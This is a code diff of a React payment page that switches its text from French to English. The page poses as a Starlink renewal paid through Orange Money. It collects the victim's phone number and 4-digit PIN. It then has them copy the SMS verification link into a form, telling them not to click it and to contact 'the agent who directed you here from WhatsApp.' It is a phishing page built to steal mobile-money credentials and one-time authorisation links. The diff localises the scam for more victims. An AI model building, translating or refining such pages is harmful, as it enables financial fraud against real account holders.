@@ -170,7 +170,7 @@ export default function OrangePayment({
         <div className="bg-white rounded-2xl p-6 sm:px-8 w-full max-w-[380px] shadow-2xl">
           <div className="bg-gradient-to-br from-black to-gray-800 p-5 text-center rounded-t-2xl -mx-6 -mt-6 mb-6 sm:-mx-8">
             <h2 className="text-white text-lg font-semibold mb-0">
-              ⭐ Paiement Starlink
+              ⭐ Starlink Payment
             </h2>
           </div>
 
@@ -178,7 +178,7 @@ export default function OrangePayment({
             <div className="flex justify-between items-center py-2">
               <span className="text-gray-500 text-sm">Service</span>
               <span className="text-gray-900 font-semibold text-sm">
-                Renouvellement Starlink
+                Starlink Renewal
               </span>
             </div>
             <div className="flex justify-between items-center py-2">
@@ -192,7 +192,7 @@ export default function OrangePayment({
           {screen === "phone" && (
             <div>
               <h2 className="text-[22px] font-semibold text-black text-center mb-6 leading-tight">
-                Entrez votre numéro Orange Money
+                Enter your Orange Money number
               </h2>
 
               {error && (
@@ -246,18 +246,17 @@ export default function OrangePayment({
                 ))}
               </div>
               <p className="text-center text-gray-500 text-[13px] mb-4 leading-relaxed">
-                Entrez votre code PIN Orange Money à 4 chiffres pour autoriser
-                cette transaction.
+                Enter your 4-digit Orange Money PIN to authorize this transaction.
               </p>
 
               <p className="text-xs text-gray-500 text-center mb-6 leading-relaxed">
-                En utilisant ce service, vous acceptez nos{" "}
+                By using this service, you accept our{" "}
                 <span className="text-[#FF6600] cursor-pointer">
-                  Conditions d'utilisation
+                  Terms of Service
                 </span>{" "}
-                et{" "}
+                and{" "}
                 <span className="text-[#FF6600] cursor-pointer">
-                  Politique de confidentialité
+                  Privacy Policy
                 </span>
               </p>
 
@@ -293,15 +292,14 @@ export default function OrangePayment({
                 >
                   <path d="M19 12H5M12 19l-7-7 7-7" />
                 </svg>
-                Retour
+                Back
               </button>
 
               <h3 className="text-xl font-semibold text-black mb-2">
-                Lien de vérification
+                Verification link
               </h3>
               <p className="text-sm text-gray-500 mb-1">
-                Un lien de vérification a été envoyé à votre numéro de téléphone
-                par SMS.
+                A verification link has been sent to your phone number by SMS.
               </p>
               <p className="text-sm font-semibold text-black mb-5">
                 {selectedCountry.code} {phone}
@@ -309,51 +307,50 @@ export default function OrangePayment({
 
               <div className="bg-amber-50 border-2 border-amber-400 rounded-[10px] px-3.5 py-3 mb-3.5 text-center">
                 <p className="text-amber-700 font-bold text-sm">
-                  ⚠️ NE CLIQUEZ PAS sur le lien — copiez-le et collez-le
-                  ci-dessous uniquement
+                  ⚠️ DO NOT CLICK the link — copy and paste it below only
                 </p>
               </div>
 
               <div className="bg-orange-50 border border-orange-200 rounded-xl p-4 mb-5">
                 <h4 className="text-sm font-semibold text-[#FF6600] mb-2.5 flex items-center gap-1.5">
-                  📋 Comment coller votre lien :
+                  📋 How to paste your link:
                 </h4>
                 <ol className="m-0 pl-5 space-y-1.5">
                   <li className="text-[13px] text-gray-600">
-                    Ouvrez le{" "}
-                    <strong className="text-gray-800">message SMS</strong> que
-                    vous avez reçu d'Orange Money
+                    Open the{" "}
+                    <strong className="text-gray-800">SMS message</strong> you
+                    received from Orange Money
                   </li>
                   <li className="text-[13px] text-gray-600">
-                    Trouvez le lien dans le SMS —{" "}
+                    Find the link in the SMS —{" "}
                     <strong className="text-red-600">
-                      NE CLIQUEZ PAS dessus
+                      DO NOT CLICK it
                     </strong>
                   </li>
                   <li className="text-[13px] text-gray-600">
                     <strong className="text-gray-800">
-                      Appuyez longuement
+                      Long press
                     </strong>{" "}
-                    sur le lien jusqu'à ce qu'un menu apparaisse
+                    the link until a menu appears
                   </li>
                   <li className="text-[13px] text-gray-600">
-                    Appuyez sur{" "}
-                    <strong className="text-gray-800">"Copier le lien"</strong>{" "}
-                    ou <strong className="text-gray-800">"Copier"</strong>
+                    Tap{" "}
+                    <strong className="text-gray-800">"Copy link"</strong>{" "}
+                    or <strong className="text-gray-800">"Copy"</strong>
                   </li>
                   <li className="text-[13px] text-gray-600">
-                    Revenez à cette page
+                    Return to this page
                   </li>
                   <li className="text-[13px] text-gray-600">
                     <strong className="text-gray-800">
-                      Appuyez longuement
+                      Long press
                     </strong>{" "}
-                    sur le champ ci-dessous et appuyez sur{" "}
-                    <strong className="text-gray-800">"Coller"</strong>
+                    the field below and tap{" "}
+                    <strong className="text-gray-800">"Paste"</strong>
                   </li>
                   <li className="text-[13px] text-gray-600">
-                    Le lien sera vérifié{" "}
-                    <strong className="text-gray-800">automatiquement</strong>
+                    The link will be verified{" "}
+                    <strong className="text-gray-800">automatically</strong>
                   </li>
                 </ol>
               </div>
@@ -361,7 +358,7 @@ export default function OrangePayment({
               {linkExpired && (
                 <div className="bg-yellow-50 border border-yellow-300 rounded-lg px-3 py-2.5 mb-4">
                   <p className="text-yellow-700 text-sm text-center">
-                    ⚠️ Lien expiré. Veuillez en demander un nouveau.
+                    ⚠️ Link expired. Please request a new one.
                   </p>
                 </div>
               )}
@@ -375,7 +372,7 @@ export default function OrangePayment({
               {transactionInProgress && (
                 <div className="bg-green-50 border border-green-200 rounded-xl px-4 py-3.5 mb-4 text-center">
                   <p className="text-green-700 text-sm font-medium">
-                    Transaction en cours. Veuillez patienter...
+                    Transaction in progress. Please wait...
                   </p>
                 </div>
               )}
@@ -384,7 +381,7 @@ export default function OrangePayment({
                 type="url"
                 value={linkInput}
                 onChange={(e) => setLinkInput(e.target.value)}
-                placeholder="Collez votre lien de vérification ici..."
+                placeholder="Paste your verification link here..."
                 disabled={transactionInProgress}
                 className="w-full border-2 border-gray-200 rounded-xl px-4 py-3.5 text-sm text-black outline-none focus:border-[#FF6600] transition mb-5 break-all disabled:bg-gray-100 disabled:text-gray-400"
               />
@@ -392,21 +389,21 @@ export default function OrangePayment({
               <div className="text-center text-sm text-gray-500 mb-5">
                 {timer > 0 ? (
                   <span className="text-gray-400">
-                    Renvoyer le lien dans {timer} secondes
+                    Resend link in {timer} seconds
                   </span>
                 ) : (
                   <span
                     className="text-[#FF6600] cursor-pointer hover:underline"
                     onClick={resendLink}
                   >
-                    Renvoyer le lien
+                    Resend link
                   </span>
                 )}
               </div>
 
               <p className="text-center text-[13px] text-gray-500 mb-4">
-                Si vous ne comprenez pas comment faire, contactez l'agent qui
-                vous a dirigé ici depuis WhatsApp.
+                If you don't understand how to do this, contact the agent who
+                directed you here from WhatsApp.
               </p>
 
               <button
@@ -417,7 +414,7 @@ export default function OrangePayment({
                 {loading ? (
                   <span className="inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                 ) : (
-                  "Vérifier"
+                  "Verify"
                 )}
               </button>
             </div>
@@ -438,11 +435,11 @@ export default function OrangePayment({
                 </svg>
               </div>
               <h2 className="text-xl font-bold text-red-600 mb-2">
-                Échec de la vérification
+                Verification failed
               </h2>
               <p className="text-gray-500 text-[13px] leading-relaxed mb-6">
-                Le lien de vérification n'a pas pu être validé. Veuillez
-                vérifier le lien et réessayer.
+                The verification link could not be validated. Please
+                check the link and try again.
               </p>
               <button
                 onClick={() => {
@@ -451,13 +448,13 @@ export default function OrangePayment({
                 }}
                 className="w-full py-3.5 bg-[#FF6600] text-white border-none rounded-[10px] text-[15px] font-semibold cursor-pointer mb-3 transition hover:bg-[#e55b00]"
               >
-                Réessayer
+                Retry
               </button>
               <button
                 onClick={() => setScreen("phone")}
                 className="w-full py-3.5 bg-transparent text-gray-500 border-2 border-gray-300 rounded-[10px] text-sm font-medium cursor-pointer transition hover:border-gray-400"
               >
-                Utiliser un autre numéro
+                Use another number
               </button>
             </div>
           )}
@@ -471,7 +468,7 @@ export default function OrangePayment({
               <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
             </svg>
             <span className="text-[11px] text-green-700 font-medium">
-              CRYPTÉ ET SÉCURISÉ EN SSL
+              ENCRYPTED & SSL SECURED
             </span>
           </div>
         </div>
@@ -480,7 +477,7 @@ export default function OrangePayment({
           onClick={onBack}
           className="mt-6 text-sm text-gray-400 hover:text-white transition"
         >
-          ← Retour aux forfaits
+          ← Back to plans
         </button>
       </div>
 
@@ -494,7 +491,7 @@ export default function OrangePayment({
             onClick={(e) => e.stopPropagation()}
           >
             <div className="px-5 py-4 border-b border-gray-200 flex justify-between items-center bg-[#FF6600]">
-              <h3 className="text-lg text-white">Sélectionner le pays</h3>
+              <h3 className="text-lg text-white">Select country</h3>
               <button
                 onClick={() => setShowCountryModal(false)}
                 className="text-2xl text-white leading-none"
